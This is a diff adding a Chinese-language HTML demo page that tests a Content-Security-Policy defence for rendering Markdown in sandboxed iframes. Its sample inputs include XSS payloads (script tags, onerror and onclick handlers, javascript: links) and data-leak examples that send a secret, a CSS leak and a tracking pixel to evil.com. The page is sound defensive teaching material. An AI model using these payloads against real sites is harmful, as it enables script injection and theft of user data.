@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+  <meta charset="UTF-8">
+  <title>方案 G: CSP 阻止 JS 执行</title>
+  <style>
+    * {
+      box-sizing: border-box
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      margin: 0;
+      padding: 20px;
+      background: #f5f5f5
+    }
+
+    h1 {
+      font-size: 18px;
+      margin-top: 0
+    }
+
+    .desc {
+      font-size: 13px;
+      color: #555;
+      margin-bottom: 12px;
+      line-height: 1.6;
+      background: #fff;
+      padding: 12px;
+      border-radius: 4px;
+      border: 1px solid #e0e0e0
+    }
+
+    .desc code {
+      background: #f0f0f0;
+      padding: 2px 6px;
+      border-radius: 3px;
+      font-size: 12px
+    }
+
+    .container {
+      display: flex;
+      gap: 16px
+    }
+
+    .panel {
+      flex: 1;
+      min-width: 0
+    }
+
+    textarea {
+      width: 100%;
+      height: 500px;
+      font-family: Menlo, Consolas, monospace;
+      font-size: 13px;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      resize: vertical
+    }
+
+    .preview-wrap {
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      background: #fff;
+      overflow: hidden
+    }
+
+    .preview-frame {
+      border: none;
+      width: 100%;
+      height: 500px
+    }
+
+    .section-title {
+      font-weight: bold;
+      margin-bottom: 8px
+    }
+
+    .tabs {
+      display: flex;
+      border-bottom: 2px solid #e0e0e0;
+      margin-bottom: 16px
+    }
+
+    .tab {
+      padding: 8px 16px;
+      cursor: pointer;
+      font-size: 14px;
+      border: none;
+      background: none;
+      color: #666;
+      border-bottom: 3px solid transparent;
+      margin-bottom: -2px;
+      transition: all .2s
+    }
+
+    .tab:hover {
+      color: #333
+    }
+
+    .tab.active {
+      color: #2196f3;
+      border-bottom-color: #2196f3;
+      font-weight: bold
+    }
+
+    .tab-panel {
+      display: none
+    }
+
+    .tab-panel.active {
+      display: block
+    }
+
+    .badge {
+      display: inline-block;
+      font-size: 11px;
+      padding: 1px 6px;
+      border-radius: 3px;
+      margin-left: 6px;
+      vertical-align: middle
+    }
+
+    .badge-safe {
+      background: #e8f5e9;
+      color: #2e7d32
+    }
+
+    .badge-warn {
+      background: #fff3e0;
+      color: #e65100
+    }
+
+    .badge-danger {
+      background: #ffebee;
+      color: #c62828
+    }
+
+    .note {
+      font-size: 13px;
+      margin: 12px 0;
+      padding: 10px 14px;
+      border-radius: 4px;
+      line-height: 1.6
+    }
+
+    .note-info {
+      background: #e3f2fd;
+      border-left: 4px solid #2196f3;
+      color: #0d47a1
+    }
+
+    .note-warn {
+      background: #fff3e0;
+      border-left: 4px solid #ff9800;
+      color: #e65100
+    }
+
+    .note-danger {
+      background: #ffebee;
+      border-left: 4px solid #f44336;
+      color: #b71c1c
+    }
+
+    .note-success {
+      background: #e8f5e9;
+      border-left: 4px solid #4caf50;
+      color: #1b5e20
+    }
+
+    .console-box {
+      background: #1e1e1e;
+      color: #d4d4d4;
+      padding: 12px;
+      border-radius: 4px;
+      font-family: Menlo, Consolas, monospace;
+      font-size: 12px;
+      max-height: 160px;
+      overflow-y: auto;
+      margin-top: 8px
+    }
+
+    .console-box .blocked {
+      color: #f44336
+    }
+
+    .console-box .info {
+      color: #64b5f6
+    }
+
+    .console-box .ok {
+      color: #81c784
+    }
+  </style>
+</head>
+
+<body>
+  <h1>方案 G: CSP <code>script-src 'none'</code> — 阻止 JS 执行，保留 HTML 渲染</h1>
+
+  <div class="desc">
+    <strong>原理：</strong>在 iframe 的 <code>srcdoc</code> 中注入
+    <code>&lt;meta http-equiv="Content-Security-Policy" content="..."&gt;</code>，
+    浏览器级别禁止所有 JavaScript 执行。HTML / CSS 正常渲染，图片正常加载。
+  </div>
+
+  <!-- Tabs -->
+  <div class="tabs">
+    <button class="tab active" data-tab="basic">基础 CSP<span
+            class="badge badge-safe">推荐</span></button>
+    <button class="tab" data-tab="enhanced">增强 CSP<span class="badge badge-safe">最安全</span></button>
+    <button class="tab" data-tab="edge">边界 Case<span class="badge badge-warn">注意</span></button>
+    <button class="tab" data-tab="compare">CSP vs 无CSP 对比<span
+            class="badge badge-danger">直观</span></button>
+  </div>
+
+  <!-- ===== Tab 1: 基础 CSP ===== -->
+  <div class="tab-panel active" id="tab-basic">
+    <div class="note note-info">
+      <strong>基础 CSP 策略：</strong><code>script-src 'none'</code><br>
+      效果：禁止所有 inline script、外部 script、on* 事件、javascript: 协议、eval()。<br>
+      HTML 和 CSS 正常渲染，图片正常加载。
+    </div>
+    <div class="container">
+      <div class="panel">
+        <div class="section-title">Markdown 输入</div>
+        <textarea id="editor-basic"># 正常 Markdown 内容
+
+- **加粗** 和 *斜体* 和 ~~删除线~~
+- `行内代码`
+
+[正常链接](https://example.com)
+
+![Markdown图片](https://qiniucloud.qishilong.space/images202501270030826.jpg)
+
+> 引用文字
+
+```javascript
+function hello() { console.log("代码块，不执行"); }
+```
+
+---
+
+# 安全 HTML（正常渲染）
+
+&lt;div style="color: blue; font-size: 18px; border: 1px solid blue; padding: 8px;"&gt;蓝色 div 正常渲染&lt;/div&gt;
+
+&lt;img src="https://qiniucloud.qishilong.space/images202501270030826.jpg" alt="正常图片" style="width:150px" /&gt;
+
+这段有&lt;span style="color:red; font-weight:bold;"&gt;红色加粗&lt;/span&gt;的内容
+
+---
+
+# 危险 HTML（JS 被阻止，标签仍存在于 DOM）
+
+&lt;script&gt;alert('XSS-1: inline script')&lt;/script&gt;
+
+&lt;script src="https://evil.com/malware.js"&gt;&lt;/script&gt;
+
+&lt;img src=x onerror="alert('XSS-3: onerror')"&gt;
+
+&lt;div onmouseover="alert('XSS-4')">鼠标移入这里试试&lt;/div&gt;
+
+&lt;a href="javascript:alert('XSS-5')"&gt;javascript: 链接（点击无效）&lt;/a&gt;
+
+&lt;input onfocus="alert('XSS-6')" autofocus placeholder="autofocus+onfocus"&gt;
+
+&lt;button onclick="alert('XSS-7')"&gt;点击按钮&lt;/button&gt;</textarea>
+      </div>
+      <div class="panel">
+        <div class="section-title">安全预览 — CSP: <code>script-src 'none'</code></div>
+        <div class="preview-wrap">
+          <iframe id="preview-basic" class="preview-frame" sandbox="allow-same-origin"></iframe>
+        </div>
+        <div class="note note-success" style="margin-top: 8px">
+          ✅ 如果上方预览没有弹出任何 alert，说明 CSP 生效了。HTML/CSS/Image 应正常渲染。
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Tab 2: 增强 CSP ===== -->
+  <div class="tab-panel" id="tab-enhanced">
+    <div class="note note-info">
+      <strong>增强 CSP 策略：</strong><br>
+      <code>script-src 'none'; object-src 'none'; frame-src 'none'; base-uri 'none'; form-action 'none'; style-src 'self' 'unsafe-inline'</code><br>
+      在基础 CSP 之上，额外禁止：嵌套 iframe、object/embed 插件、form 提交、base 标签劫持。
+    </div>
+    <div class="container">
+      <div class="panel">
+        <div class="section-title">Markdown 输入</div>
+        <textarea id="editor-enhanced"># 增强 CSP — 额外拦截的内容
+
+以下危险内容在基础 CSP 中可能仍有副作用，增强 CSP 全部封堵：
+
+---
+
+## iframe 嵌入（frame-src 'none' 阻止）
+
+&lt;iframe src="https://example.com" width="300" height="100"&gt;&lt;/iframe&gt;
+
+&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;
+
+## 表单提交（form-action 'none' 阻止）
+
+&lt;form action="https://evil.com/steal" method="POST"&gt;
+  &lt;input name="secret" value="password123"&gt;
+  &lt;input type="submit" value="提交按钮（点击无效）"&gt;
+&lt;/form&gt;
+
+## base 标签劫持（base-uri 'none' 阻止）
+
+&lt;base href="https://evil.com/"&gt;
+
+之后的相对链接 [相对路径](/page) 不会被劫持。
+
+## object / embed 插件（object-src 'none' 阻止）
+
+&lt;object data="https://evil.com/flash.swf" type="application/x-shockwave-flash"&gt;&lt;/object&gt;
+
+&lt;embed src="https://evil.com/exploit.swf"&gt;
+
+---
+
+# 正常内容（依然正常渲染）
+
+&lt;div style="color: green; padding: 10px; border: 2px solid green;"&gt;安全的 div&lt;/div&gt;
+
+&lt;img src="https://qiniucloud.qishilong.space/images202501270030826.jpg" style="width:120px" /&gt;
+
+**加粗** / *斜体* / ~~删除线~~ / `代码` 全部正常</textarea>
+      </div>
+      <div class="panel">
+        <div class="section-title">安全预览 — 增强 CSP</div>
+        <div class="preview-wrap">
+          <iframe id="preview-enhanced" class="preview-frame" sandbox="allow-same-origin"></iframe>
+        </div>
+        <div class="note note-success" style="margin-top: 8px">
+          ✅ iframe 不加载外部页面、表单提交被拦截、object/embed 不加载、base 不生效。
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Tab 3: 边界 Case ===== -->
+  <div class="tab-panel" id="tab-edge">
+    <div class="note note-warn">
+      <strong>⚠️ 边界 Case — CSP 方案的局限性：</strong><br>
+      CSP 只管 JS 执行，以下攻击向量不在 CSP 的管辖范围内。
+    </div>
+    <div class="container">
+      <div class="panel">
+        <div class="section-title">Markdown 输入（边界 Case）</div>
+        <textarea id="editor-edge"># CSP 无法防御的边界 Case
+
+---
+
+## 1. CSS 注入（style 标签仍然生效）
+
+&lt;style&gt;
+  body { background: red !important; color: white !important; }
+  img { display: none !important; }
+  p { font-size: 50px !important; }
+&lt;/style&gt;
+
+上方 style 标签在基础 CSP 中仍然生效！
+页面背景应该变红，图片被隐藏。
+
+---
+
+## 2. CSS 数据泄漏（理论攻击）
+
+&lt;style&gt;
+  input[value^="p"] { background: url("https://evil.com/leak?char=p"); }
+&lt;/style&gt;
+
+CSS 属性选择器 + 背景图可侧信道泄漏数据（实际场景中较少见）。
+
+---
+
+## 3. meta refresh 跳转
+
+&lt;meta http-equiv="refresh" content="999;url=https://evil.com"&gt;
+
+此处设置 999 秒延迟，避免实际跳转。在没有额外限制的情况下，meta refresh 可能生效。
+
+---
+
+## 4. 表单提交（基础 CSP 不拦截）
+
+&lt;form action="https://httpbin.org/post" method="GET"&gt;
+  &lt;input name="stolen" value="secret-data"&gt;
+  &lt;input type="submit" value="基础CSP下可提交！"&gt;
+&lt;/form&gt;
+
+基础 CSP 不限制 form-action，用户点击可以提交。增强 CSP 可拦截。
+
+---
+
+## 5. 链接仍可点击（非 JS 协议）
+
+<a href="https://www.taobao.com">普通恶意链接（可点击）</a>
+
+CSP 只拦截 javascript: 协议，普通 https 链接仍可跳转。
+
+---
+
+## 6. 图片追踪（Image Tracking Pixel）
+
+&lt;img src="https://evil.com/track?user=123" width="1" height="1"&gt;
+
+CSP 默认允许加载图片，攻击者可用 1x1 追踪像素获取用户 IP 等信息。
+
+---
+
+# 结论
+
+CSP 方案最适合与其他方案组合使用：
+- **CSP + DOMPurify**：DOMPurify 清洗 → CSP 作为兜底
+- **CSP + 增强规则**：添加 style-src / img-src / form-action 限制</textarea>
+      </div>
+      <div class="panel">
+        <div class="section-title">预览 — 基础 CSP（能观察到 CSS 注入副作用）</div>
+        <div class="preview-wrap">
+          <iframe id="preview-edge" class="preview-frame" sandbox="allow-same-origin"></iframe>
+        </div>
+        <div class="note note-danger" style="margin-top: 8px">
+          ⚠️ 页面背景变红 = CSS 注入生效。这是 CSP 方案的局限：只阻止 JS，不阻止 CSS。
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== Tab 4: 对比 ===== -->
+  <div class="tab-panel" id="tab-compare">
+    <div class="note note-danger">
+      <strong>对比实验：</strong>左侧 = 有 CSP 保护，右侧 = 无任何保护（允许脚本执行）。<br>
+      右侧 iframe 使用 <code>sandbox="allow-scripts allow-same-origin"</code>，脚本可以执行。<br>
+      尝试：鼠标移入 div、点击按钮，观察两侧差异。右侧 <code>document.write</code> 和 <code>on*</code> 事件会真正执行。
+    </div>
+    <div class="container">
+      <div class="panel">
+        <div class="section-title">有 CSP 保护 ✅</div>
+        <div class="preview-wrap">
+          <iframe id="preview-csp-on" class="preview-frame" sandbox="allow-same-origin"></iframe>
+        </div>
+        <div id="csp-console" class="console-box">
+          <div class="info">[CSP Console] 等待渲染...</div>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="section-title">无保护 ❌（脚本可执行）</div>
+        <div class="preview-wrap">
+          <iframe id="preview-csp-off" class="preview-frame"
+                  sandbox="allow-scripts allow-same-origin"></iframe>
+        </div>
+        <div id="nocsp-console" class="console-box">
+          <div class="info">[No-CSP Console] 等待渲染...</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- marked CDN -->
+  <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+  <script>
+    // ====== Style for preview ======
+    var CSS = 'body{font-family:-apple-system,sans-serif;padding:16px;margin:0;line-height:1.6;color:#333}pre{background:#1e1e1e;color:#d4d4d4;padding:16px;border-radius:4px;overflow-x:auto}code{font-family:Menlo,Consolas,monospace;font-size:13px}p>code,li>code{background:#f0f0f0;padding:2px 6px;border-radius:3px}blockquote{border-left:4px solid #ddd;margin:0;padding:8px 16px;color:#666}table{border-collapse:collapse}th,td{border:1px solid #ddd;padding:8px;text-align:left}img{max-width:100%}hr{border:none;border-top:1px solid #ddd;margin:24px 0}';
+
+    // ====== CSP Policies ======
+    var CSP_BASIC = "script-src 'none'";
+    var CSP_ENHANCED = "script-src 'none'; object-src 'none'; frame-src 'none'; base-uri 'none'; form-action 'none'";
+
+    // ====== Build srcdoc ======
+    function buildDoc(html, cspPolicy) {
+      var cspTag = cspPolicy
+        ? '<meta http-equiv="Content-Security-Policy" content="' + cspPolicy + '">'
+        : '';
+      return '<!DOCTYPE html><html><head><meta charset="UTF-8">'
+        + cspTag
+        + '<style>' + CSS + '</style></head><body>'
+        + html + '</body></html>';
+    }
+
+    // ====== Tab switching ======
+    var tabs = document.querySelectorAll('.tab');
+    var panels = document.querySelectorAll('.tab-panel');
+    tabs.forEach(function (tab) {
+      tab.addEventListener('click', function () {
+        tabs.forEach(function (t) { t.classList.remove('active'); });
+        panels.forEach(function (p) { p.classList.remove('active'); });
+        tab.classList.add('active');
+        document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
+      });
+    });
+
+    // ====== Render functions ======
+    function renderBasic() {
+      var md = document.getElementById('editor-basic').value;
+      var html = marked.parse(md);
+      document.getElementById('preview-basic').srcdoc = buildDoc(html, CSP_BASIC);
+    }
+
+    function renderEnhanced() {
+      var md = document.getElementById('editor-enhanced').value;
+      var html = marked.parse(md);
+      document.getElementById('preview-enhanced').srcdoc = buildDoc(html, CSP_ENHANCED);
+    }
+
+    function renderEdge() {
+      var md = document.getElementById('editor-edge').value;
+      var html = marked.parse(md);
+      // 基础 CSP — style 不拦截，故 CSS 注入可见
+      document.getElementById('preview-edge').srcdoc = buildDoc(html, CSP_BASIC);
+    }
+
+    function renderCompare() {
+      var compareMarkdown = '# 对比测试\n\n'
+        + '正常内容：**加粗** *斜体*\n\n'
+        + '<div style="color:blue;padding:8px;border:1px solid blue">蓝色 div</div>\n\n'
+        + '<img src="https://qiniucloud.qishilong.space/images202501270030826.jpg" style="width:100px">\n\n'
+        + '---\n\n'
+        + '## 危险内容\n\n'
+        + '<script>document.write("<b style=color:red>SCRIPT EXECUTED!</b>")<\/script>\n\n'
+        + '<img src=x onerror="this.src=\'https://qiniucloud.qishilong.space/images202501270030826.jpg\';this.style.border=\'3px solid red\'">\n\n'
+        + '<div onmouseover="this.style.background=\'red\';this.textContent=\'HACKED!\'">鼠标移入这里</div>\n\n'
+        + '<a href="javascript:void(document.body.style.background=\'red\')">点击试试</a>\n\n'
+        + '<button onclick="this.textContent=\'CLICKED!\'">点击按钮</button>\n';
+
+      var html = marked.parse(compareMarkdown);
+
+      // CSP ON
+      document.getElementById('preview-csp-on').srcdoc = buildDoc(html, CSP_ENHANCED);
+      // CSP OFF — 脚本可执行
+      document.getElementById('preview-csp-off').srcdoc = buildDoc(html, null);
+
+      // Console output
+      var cspConsole = document.getElementById('csp-console');
+      cspConsole.innerHTML = ''
+        + '<div class="ok">[CSP] script-src \'none\' 生效</div>'
+        + '<div class="blocked">[CSP] ✘ &lt;script&gt; 被阻止执行</div>'
+        + '<div class="blocked">[CSP] ✘ onerror 被阻止执行</div>'
+        + '<div class="blocked">[CSP] ✘ onmouseover 被阻止执行</div>'
+        + '<div class="blocked">[CSP] ✘ javascript: 协议被阻止</div>'
+        + '<div class="blocked">[CSP] ✘ onclick 被阻止执行</div>'
+        + '<div class="ok">[CSP] ✓ HTML/CSS 正常渲染</div>'
+        + '<div class="ok">[CSP] ✓ 图片正常加载</div>';
+
+      var nocspConsole = document.getElementById('nocsp-console');
+      nocspConsole.innerHTML = ''
+        + '<div class="blocked">[No-CSP] 无 CSP 保护，脚本可执行！</div>'
+        + '<div class="blocked">[No-CSP] ✗ document.write 已执行（页面显示红色 SCRIPT EXECUTED!）</div>'
+        + '<div class="blocked">[No-CSP] ✗ onmouseover 可触发（鼠标移入 div 会变红）</div>'
+        + '<div class="blocked">[No-CSP] ✗ onclick 可触发（点击按钮文字会变化）</div>'
+        + '<div class="blocked">[No-CSP] ✗ onerror 可触发（broken img 会自动修复并加红色边框）</div>'
+        + '<div class="info">[No-CSP] 对比左侧可以看到 CSP 的保护效果</div>';
+    }
+
+    // ====== Event listeners ======
+    document.getElementById('editor-basic').addEventListener('input', renderBasic);
+    document.getElementById('editor-enhanced').addEventListener('input', renderEnhanced);
+    document.getElementById('editor-edge').addEventListener('input', renderEdge);
+
+    // ====== Initial render ======
+    renderBasic();
+    renderEnhanced();
+    renderEdge();
+    renderCompare();
+  </script>
+</body>
+
+</html>
